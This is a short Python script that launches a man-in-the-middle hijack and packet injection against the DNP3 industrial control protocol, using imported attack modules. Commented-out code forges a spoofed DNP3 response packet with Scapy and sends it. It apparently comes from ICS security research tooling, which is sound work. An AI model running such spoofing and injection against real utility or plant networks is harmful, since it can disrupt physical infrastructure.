__author__ = 'Nicholas Rodofile'

from DNP3_MITM import *
from DNP3_Injection import *
from DNP3_MITM_Injection import *

#mitm = DNP3_MITM_conf()
#pcap_filename = mitm.start()

hijack = DNP3_MITM_Injection_conf()
pcap_file = hijack.start()

#injection = DNP3_Injection_conf(verbose=0, pkt_count=100)
#injection.init_spoofing()
#pcap_filename = injection.start()

# hex = "0c0128010000000301640041b200006400000000005b".decode("hex")
#
# ethernet = Ether(src="00:0c:c1:00:01:01", dst="08:00:27:c4:ee:78")
# ip = IP(src="10.192.168.4", dst="10.192.168.1")
# tcp = TCP(seq=1, ack=1, sport=20000, dport=20000, flags='PA',
#                   options=[('Timestamp', (11110, 111167))])
# tcp_ip = ethernet/ip/tcp
# dnp3_control = DNP3HeaderControl(DIR=UNSET, PRM=SET)
# dnp3_head = DNP3(DESTINATION=10, SOURCE=1, CONTROL=dnp3_control)
# dnp3_transport = DNP3Transport(FIN=SET, FIR=SET, SEQUENCE=10)
# dnp3_application_ctrl = DNP3ApplicationControl(FIR=SET, FIN=UNSET, CON=UNSET, UNS=UNSET,
#                                                SEQ=100)
# dnp3_application_response = DNP3ApplicationResponse(Application_control=dnp3_application_ctrl,
#                                                     FUNC_CODE="RESPONSE",
#                                                     IIN=DNP3ApplicationIIN())
# dnp3 = dnp3_head/dnp3_transport/dnp3_application_response
# pkt = tcp_ip/dnp3/hex
# pkt.show2()
# sendp(pkt)
